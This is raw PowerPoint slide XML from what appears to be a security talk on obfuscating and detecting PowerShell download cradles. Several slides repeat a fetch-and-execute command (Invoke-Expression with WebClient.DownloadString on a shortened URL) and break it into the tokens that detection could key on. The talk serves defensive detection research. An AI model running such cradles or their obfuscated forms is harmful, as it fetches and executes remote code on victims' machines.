              <a:t>Highlights cradle artifacts and behaviors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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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53393" y="902899"/>
            <a:ext cx="3706888" cy="494251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929887" y="5833915"/>
            <a:ext cx="46478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http://www.unmotivating.com/wp-content/uploads/2014/04/5LgP6.jpg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16605249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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection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MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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20654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smtClean="0"/>
              <a:t>Current State of PowerShell Obfuscation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7115905" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>DerbyCon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> 2016, I released </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Invoke-Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>github.com/danielbohannon/Invoke-Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Open-source </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>framework for obfuscating PowerShell commands and scripts </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Randomizes obfuscation syntaxes at several layers:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Token layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>String layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Encoding layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Launcher layer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Let’s see an example of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>this </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>"style" of obfuscation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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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4105" y="1277091"/>
            <a:ext cx="3717261" cy="4813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75135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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>("https://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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58673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own Arrow 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1992268" y="2579732"/>
            <a:ext cx="347369" cy="134861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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>("https://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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9495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own Arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1641400">
            <a:off x="3085075" y="2468285"/>
            <a:ext cx="347369" cy="188156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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>("https://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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61801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own Arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2307213">
            <a:off x="4504488" y="2393962"/>
            <a:ext cx="347369" cy="2453563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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>("https://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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19692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own Arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="3107358">
            <a:off x="5394451" y="1905426"/>
            <a:ext cx="347369" cy="382106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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>s://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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47733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800" dirty="0" smtClean="0"/>
              <a:t>Obfuscating the Cradle: (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" err="1" smtClean="0"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3800" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>s://bit.ly/L3g1t")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>What process command line </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t> can we key off of for this?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-Expression</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>System.Net.WebClient</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("http</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
